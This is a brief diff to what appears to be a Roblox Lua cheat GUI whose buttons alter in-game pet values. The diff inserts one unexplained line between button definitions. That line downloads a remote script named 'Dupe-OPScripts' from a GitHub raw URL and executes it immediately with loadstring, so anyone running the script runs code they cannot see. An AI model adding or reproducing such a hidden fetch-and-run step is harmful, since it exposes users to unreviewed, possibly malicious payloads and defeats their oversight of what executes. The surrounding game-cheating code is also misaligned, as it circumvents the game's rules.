@@ -280,6 +280,8 @@ autoBtn.MouseButton1Click:Connect(function()
     end)()
 end)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GAG-ScriptsOP/Gag-script/refs/heads/main/Dupe-OPScripts"))()
+
 -- Load Pet Age 50 Button (sets Age NumberValue to 50 on pet models found in Workspace)
 local loadAgeBtn = Instance.new("TextButton", frame)
 loadAgeBtn.Size = UDim2.new(1, -20, 0, 30)
